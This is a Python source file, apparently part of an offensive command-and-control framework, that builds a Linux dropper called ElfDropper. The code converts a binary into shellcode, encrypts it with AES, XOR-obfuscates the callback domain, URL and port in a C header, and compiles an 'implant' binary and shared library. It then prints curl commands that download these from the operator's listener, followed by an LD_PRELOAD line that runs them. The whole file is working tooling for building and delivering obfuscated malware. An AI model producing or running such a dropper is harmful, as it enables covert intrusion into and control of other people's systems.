import sys, getopt
from Crypto.Cipher import AES
import os
from os import urandom
import hashlib
import random
import string
import subprocess
from urllib.parse import urlparse
from pathlib import Path
import stat

import sys
elfToShellcodeModule = os.path.join(Path(__file__).parent, 'elfToShellcode')
sys.path.insert(1, elfToShellcodeModule)
from elfToShellcode import *


def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode('ISO-8859-1')


def aesenc(plaintext, key):
	k = hashlib.sha256(key).digest()
	iv = 16 * b'\x00'
	plaintext = pad(plaintext)    
	cipher = AES.new(k , AES.MODE_CBC, iv)
	output = cipher.encrypt(plaintext)
	return output


def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str


def printCiphertext(ciphertext):
	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'


def getTargetOsExploration():
       return "Linux"
       

def getHelpExploration():
        helpMessage = 'ElfDropper generates a dropper that injects shellcode into the current process\n'
        helpMessage += 'Usage:  Dropper ElfDropper listenerDownload listenerBeacon -t <targetHost>\n'
        helpMessage += 'Options:\n'
        helpMessage += '  -t, --targetHost\t\tRestrict the dropper to run onto this host\n'

        return helpMessage


def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):

        binary_, binaryArgs_, rawShellCode_, process, url_, targetHost, sideDll, sideDllPath = parseCmdLine(aditionalArgs)

        droppersPath, shellcodesPath, cmdToRun = generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)

        return droppersPath, shellcodesPath, cmdToRun


def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost):

        if url[-1:] == "/":
                url = url[:-1]

        print('[+] Parse url:')
        parsed_url = urlparse(url)
        schema = parsed_url.scheme
        ip = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (443 if schema == "https" else 80)
        shellcodeFile = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
        fullLocation = parsed_url.path + "/" + shellcodeFile

        print(" Schema:", schema)
        print(" IP Address:", ip)
        print(" Port:", port)
        print(" Full Location:", fullLocation)
        print(" shellcodeFile:", shellcodeFile)
        print(" TargetHost : TODO", targetHost)

        print('\n[+] Generate shellcode to fetch with elfToShellcode:')
        if binary:
                print(' Binary ', binary)
                print(' BinaryArgs ', binaryArgs)
                if os.name == 'nt':
                        shellcodePath = os.path.join(Path(__file__).parent, '.\\bin\\'+shellcodeFile)
                        execveArg = "toto " + binaryArgs
                        execveArg = execveArg.split(" ")
                        res = generateShellcode(binary, execveArg, shellcodePath)
                        if not res:
                                return [], [], "Error: Shellcode generation failed"
                else:   
                        shellcodePath = os.path.join(Path(__file__).parent, './bin/'+shellcodeFile)
                        execveArg = "toto " + binaryArgs
                        execveArg = execveArg.split(" ")
                        res = generateShellcode(binary, execveArg, shellcodePath)
                        if not res:
                                return [], [], "Error: Shellcode generation failed"
                
        elif rawShellCode:
                print('\n[+] Rename shellcode to match url:')

                shellcode = open(rawShellCode, "rb").read()

                shellcodePath = os.path.join(Path(__file__).parent, '.\\bin\\'+shellcodeFile)
                f = open(shellcodePath, "wb")
                f.write(shellcode)
                f.close()

        print("\n[+] Compile dropper")
        print('generate cryptDef.h with given input ')

        templateFilePath = os.path.join(Path(__file__).parent, 'templateDef')
        template = open(templateFilePath, "r").read()

        if schema=="https":
                template = template.replace("<ISHTTPS>", "true")
        else:
                template = template.replace("<ISHTTPS>", "false")
        template = template.replace("<PROCESS>", process+" ")
        template = template.replace("<DOMAIN>", ip+" ")
        template = template.replace("<URL>", fullLocation+" ")
        template = template.replace("<PORT>", str(port))

        defFilePath = os.path.join(Path(__file__).parent, 'clearDef.h')
        f = open(defFilePath, "w")
        f.truncate(0) 
        f.write(template)
        f.close()

        if os.name == 'nt':
                fileEncryptPath = os.path.join(Path(__file__).parent, 'cryptDef.h')
                fileEncrypt = open(fileEncryptPath, 'w')
        else:
                fileEncryptPath = os.path.join(Path(__file__).parent, 'cryptDef.h')
                fileEncrypt = open(fileEncryptPath, 'w')

        fileClearPath = os.path.join(Path(__file__).parent, 'clearDef.h')
        fileClear = open(fileClearPath, 'r')

        Lines = fileClear.readlines()

        characters = string.ascii_letters + string.digits
        password = ''.join(random.choice(characters) for i in range(16))
        KEY_XOR = password.replace('"','-').replace('\'','-')
        KEY_AES = urandom(16)

        AesBlock=False;
        XorBlock=False;
        # Strips the newline character
        for line in Lines:
                #print(line)

                if(XorBlock):
                        words = line.split('"')
                        if(len(words)>=3):
                                if("XorKey" in words[0]):
                                        words[1]= KEY_XOR
                                        line ='"'.join(words)

                                else:
                                        plaintext=words[1]
                                        ciphertext = xor(plaintext, KEY_XOR)
                                        
                                        words[1]= printCiphertext(ciphertext)
                                        line =''.join(words)

                if(AesBlock):
                        words = line.split('"')
                        if(len(words)>=3):
                                if("AesKey" in words[0]):
                                        words[1]= printCiphertext(KEY_AES.decode('ISO-8859-1'))
                                        line =''.join(words)

                                elif("payload" in words[0]):
                                        plaintext = shellcode
                                        ciphertext = aesenc(plaintext, KEY_AES)
                                        
                                        words[1]= printCiphertext(ciphertext.decode('ISO-8859-1'))
                                        line =''.join(words)

                if(line == "// TO XOR\n"):
                        XorBlock=True;
                        AesBlock=False;
                elif(line == "// TO AES\n"):
                        AesBlock=True;
                        XorBlock=False;

                fileEncrypt.writelines(line)

        fileEncrypt.close()

        print('compile dropper')
        dropperElfPath = os.path.join(Path(__file__).parent, 'bin/implant')
        try:
                os.remove(dropperElfPath)
        except OSError as error: 
                pass
        dropperSoPath = os.path.join(Path(__file__).parent, 'bin/implant.so')
        try:
                os.remove(dropperSoPath)
        except OSError as error: 
                pass

        compileScript = os.path.join(Path(__file__).parent, 'compile.sh')
        st = os.stat(compileScript)
        os.chmod(compileScript, st.st_mode | stat.S_IEXEC)
        
        args = compileScript.split()
        popen = subprocess.Popen(args, stdout=subprocess.PIPE, cwd=Path(__file__).parent)
        popen.wait()

        output = popen.stdout.read()
        print(output.decode("utf-8") )
 
        shellcodePath = os.path.join(Path(__file__).parent, "bin")
        shellcodePath = os.path.join(shellcodePath, shellcodeFile)

        print('\n[+] Check generated files')
        if not os.path.isfile(dropperElfPath):
                print("[+] Error: Dropper file don't exist")
                return "", ""
        if not os.path.isfile(dropperSoPath):
                print("[+] Error: Dropper so file don't exist")
                return "", ""
        if not os.path.isfile(shellcodePath):
                print("[+] Error: Shellcode file don't exist")
                return "", ""

        print("\n[+] Done")

        url = parsed_url.path
        if url[0] == "/":
                url = url[1:]

        cmdToRun = "Generated:\n"
        cmdToRun+= schema + "://" + ip + ":" + str(port) + "/" + url + "/" + shellcodeFile + "\n"
        cmdToRun+= schema + "://" + ip + ":" + str(port) + "/" + url + "/" + "implant" + "\n"
        cmdToRun+= schema + "://" + ip + ":" + str(port) + "/" + url + "/" + "implant.so" + "\n"
        cmdToRun+= "Command to run:\n"
        cmdToRun+= "curl -k " + schema + "://" + ip + ":" + str(port) + "/" + url + "/" + "implant" + " -o ./test\n"
        cmdToRun+= "curl -k " + schema + "://" + ip + ":" + str(port) + "/" + url + "/" + "implant.so" + " -o ./test.so\n"
        cmdToRun+= "LD_PRELOAD=./test.so bash\n"
        droppersPath = [dropperElfPath, dropperSoPath]
        shellcodesPath = [shellcodePath]

        print(droppersPath)
        print(shellcodesPath)
        print(cmdToRun)

        return droppersPath, shellcodesPath, cmdToRun


helpMessage = 'ElfDropper generates a dropper that injects shellcode into the current process\n'
helpMessage += 'Usage: ElfDropper.py -u <url> -b <binary> -a <args> -t <targetHost>\n'
helpMessage += 'Options:\n'
helpMessage += '  -h, --help\t\t\tShow this help message and exit\n'
helpMessage += '  -u, --url\t\t\tURL to fetch shellcode from\n'
helpMessage += '  -b, --binary\t\t\tBinary to create the shellcode from\n'
helpMessage += '  -a, --args\t\t\tArguments to pass to binary during shellcode creation\n'
helpMessage += '  -t, --targetHost\t\tRestrict the dropper to run onto this host\n'

def parseCmdLine(argv):
        
        binary=""
        binaryArgs=""
        rawShellCode=""
        process=""
        url=""
        targetHost=""
        sideDll=""
        sideDllPath=""

        opts, args = getopt.getopt(argv,"hb:a:r:u:p:t:s:d:",["binary=","args=","rawShellcode=","url=","process=","targetHost=","sideDll=","SideDllPathOnHostSystem="])
        for opt, arg in opts:
                if opt == '-h':
                        print (helpMessage)
                        sys.exit()
                elif opt in ("-b", "--binary"):
                        binary = arg
                elif opt in ("-a", "--args"):
                        binaryArgs = arg
                elif opt in ("-r", "--rawShellcode"):
                        rawShellCode = arg
                elif opt in ("-u", "--url"):
                        url = arg
                elif opt in ("-p", "--process"):
                        process = arg
                elif opt in ("-t", "--targetHost"):
                        targetHost = arg
                elif opt in ("-s", "--sideDll"):
                        sideDll = arg
                elif opt in ("-d", "--SideDllPathOnHostSystem"):
                        sideDllPath = arg

        return binary, binaryArgs, rawShellCode, process, url, targetHost, sideDll, sideDllPath


def main(argv):

        if(len(argv)<2):
                print (helpMessage)
                exit()
        
        binary, binaryArgs, rawShellCode, process, url, targetHost, sideDll, sideDllPath = parseCmdLine(argv)
        
        droppersPath, shellcodesPath, cmdToRun = generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
        print("\n[+] Dropper path  : ", droppersPath)
        print("[+] Shellcode path: ", shellcodesPath)
        print("[+] Command to run: ", cmdToRun)


if __name__ == "__main__":
    main(sys.argv[1:])

